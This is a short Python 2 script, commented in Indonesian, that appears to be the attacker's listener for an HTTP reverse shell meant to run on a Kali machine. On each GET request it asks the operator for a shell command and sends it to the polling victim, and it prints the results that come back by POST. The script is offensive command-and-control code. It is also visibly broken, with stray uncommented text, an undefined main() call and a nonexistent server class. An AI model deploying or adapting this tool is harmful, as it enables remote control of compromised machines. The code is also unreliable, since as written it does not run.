import BaseHTTPServer # membuat library saya menggunakan build simple http server

HOST_NAME = 'your ip for kali' # kali ip address
PORT_NUMBER = '80' mendenger number port 

class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):

	def do_GET(s):
		# jika kami dapat get requesion maka kami

		command = raw_input("shell>~>") # take the user input
		s.send_response(200)
		s.send_header("content-type", "text/html")
		s.end_headers()
		s.wfile.write(command)

	def do_POST(s):

		s.send_response(200)
		s.end_headers()
		length = int(s.headers['content-length'])

		postVar = s.rfile.read(length)
		print postVar

if __name__ == '__main__':
	main()


	server_class = BaseHTTPServer.BaseHTTPServer
	httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)


	try:
		httpd.serve_forever()
	except KeyboardInterrupt:
		print '[*] server is termineted'
		httpd.server_close()